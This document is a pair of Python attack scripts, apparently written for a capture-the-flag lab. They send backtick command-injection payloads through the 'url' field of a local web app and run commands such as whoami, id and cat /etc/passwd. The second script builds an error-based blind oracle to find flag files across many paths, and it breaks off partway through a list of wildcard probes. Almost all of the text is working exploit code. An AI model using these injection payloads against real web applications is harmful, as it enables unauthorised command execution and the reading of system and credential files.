import requests

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send(payload):
    data = f"url={payload}"
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        return resp.status_code, len(resp.text), resp.text[:300]
    except Exception as e:
        return "ERROR", 0, str(e)[:100]

print("[+] Examining detailed response differences...")
print("[+] This may reveal successful execution\n")

# Compare responses between valid command and invalid
print("="*60)
print("[ANALYSIS] Response size and content comparison")
print("="*60)

test_cases = [
    ("`echo 1`", "Simple echo"),
    ("`ech x`", "Invalid command"),
    ("`whoami`", "whoami"),
    ("`id`", "id command"),
    ("`uname -a`", "uname"),
    ("`cat /etc/passwd`", "Read passwd"),
    ("`cat /nonexistent_12345`", "Read nonexistent"),
    ("`ls`", "List directory"),
    ("`ls -la`", "List detailed"),
    ("`pwd`", "Print working dir"),
    ("`cat flag.txt`", "Read flag.txt"),
    ("`cat /app/flag.txt`", "Read /app/flag.txt"),
]

results = []
for payload, desc in test_cases:
    status, length, text = send(payload)
    results.append((desc, payload, status, length, text))
    print(f"\n{desc}:")
    print(f"  Status: {status}, Length: {length}")
    
# Look for patterns
print("\n" + "="*60)
print("[PATTERN ANALYSIS]")
print("="*60)

# Group by status code
status_groups = {}
for desc, payload, status, length, text in results:
    key = f"Status:{status}"
    if key not in status_groups:
        status_groups[key] = []
    status_groups[key].append((desc, length))

for status, items in status_groups.items():
    print(f"\n{status}:")
    for desc, length in items:
        print(f"  - {desc}: {length} bytes")

# Look for length differences
print("\n[LENGTH ANOMALIES]")
lengths = [r[3] for r in results]
if len(set(lengths)) > 1:
    print("Different response sizes detected!")
    unique_sizes = set(lengths)
    for size in unique_sizes:
        matches = [r[0] for r in results if r[3] == size]
        print(f"  Size {size}: {matches}")
else:
    print(f"All responses same size: {lengths[0]} bytes")

# Check response content for error messages
print("\n[ERROR MESSAGE ANALYSIS]")
for desc, payload, status, length, text in results:
    if "error" in text.lower() or "exception" in text.lower():
        print(f"\n{desc} contains error info")
        # Extract error details
        import re
        err_match = re.search(r'(Error|Exception)[^<]+', text, re.I)
        if err_match:
            print(f"  {err_match.group(0)[:100]}")

print("\n" + "="*60)
print("[+] Testing if error codes differ for existing vs non-existing files")
print("="*60)

# Check if different commands produce different status codes
status_analysis = {}
for desc, payload, status, length, text in results:
    if status not in status_analysis:
        status_analysis[status] = []
    status_analysis[status].append(desc)

print("\nStatus code distribution:")
for status, descs in status_analysis.items():
    print(f"  {status}: {len(descs)} tests")

# Check for specific file-related differences
print("\n" + "="*60)
print("[SPECIFIC FILE EXISTENCE CHECK]")
print("="*60)

# Use $? which returns exit code - 0 means success
file_checks = [
    ("`cat /etc/passwd > /dev/null; echo $?`", "/etc/passwd exists check"),
    ("`cat /nonexistent_12345 > /dev/null; echo $?`", "nonexistent check"),
    ("`cat flag.txt > /dev/null; echo $?`", "flag.txt exit code"),
    ("`cat /app/flag.txt > /dev/null; echo $?`", "/app/flag.txt exit code"),
]

for payload, desc in file_checks:
    status, length, text = send(payload)
    print(f"\n{desc}:")
    print(f"  Status: {status}, Response: {text[:200]}")


import requests

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send(payload):
    data = f"url={payload}"
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        return resp.status_code, len(resp.text), "OK"
    except Exception as e:
        return "ERROR", 0, str(e)[:50]

print("[+] EXPLOITING RESPONSE-BASED BLIND DETECTION")
print("[+] echo 1 causes ERROR, but most commands return 200")
print("[+] Using this to detect file existence\n")

print("="*60)
print("[PHASE 1] Confirming error pattern with conditional output")
print("="*60)

# Test: If condition true, output "1" (causes ERROR); if false, no output (200)
tests = [
    # True should give ERROR (output 1), false should give 200 (no output)
    ("`true && echo 1`", "true condition"),
    ("`false && echo 1`", "false condition"),
    ("`[ -f /etc/passwd ] && echo 1`", "/etc/passwd exists? (should ERROR)"),
    ("`[ -f /nonexistent_12345 ] && echo 1`", "nonexistent exists? (should 200)"),
    ("`[ -f flag.txt ] && echo 1`", "flag.txt exists?"),
    ("`[ -f /app/flag.txt ] && echo 1`", "/app/flag.txt exists?"),
    ("`[ -f flag ] && echo 1`", "flag exists?"),
    ("`[ -f /flag.txt ] && echo 1`", "/flag.txt exists?"),
]

found_flag = None

for payload, desc in tests:
    status, length, msg = send(payload)
    indicator = "[EXISTS - ERROR]" if status == "ERROR" else "[NOT FOUND - 200]"
    print(f"\n{desc}")
    print(f"  Payload: {payload}")
    print(f"  Result: {status} | {indicator}")
    
    if status == "ERROR" and "flag" in desc.lower():
        print(f"  [!] !!! FLAG FILE FOUND: {desc} !!!")
        found_flag = desc

print("\n" + "="*60)
print("[PHASE 2] Testing more flag locations with [ -f file ] && echo 1")
print("="*60)

more_locations = [
    "/tmp/flag.txt",
    "/home/user/flag.txt",
    "/home/app/flag.txt",
    "../flag.txt",
    "../../flag.txt",
    "/var/flag.txt",
    "/opt/flag.txt",
    "flag.php",
    "FLAG.txt",
    "flag.png",
    "flag.jpg",
    "flags.txt",
]

for path in more_locations:
    payload = f"`[ -f {path} ] && echo 1`"
    status, length, msg = send(payload)
    result = "EXISTS" if status == "ERROR" else "NOT FOUND"
    print(f"{path}: {result}")
    if status == "ERROR":
        print(f"  [!] FLAG FOUND AT: {path}")
        found_flag = path

# Let's also try wildcard searches
print("\n" + "="*60)
print("[PHASE 3] Using wildcards to find flag files")
print("="*60)

wildcard_tests = [
    ("`ls flag* 2>/dev/null | head -1 | grep -q . && echo 1`", "flag* pattern"),
    ("`ls /app/flag* 2>/dev/null | head -1 | grep -q . && echo 1`", "/app/flag*"),
    ("`ls *.txt 2>/dev/null | grep -q flag && echo 1`", "flag in *.txt"),
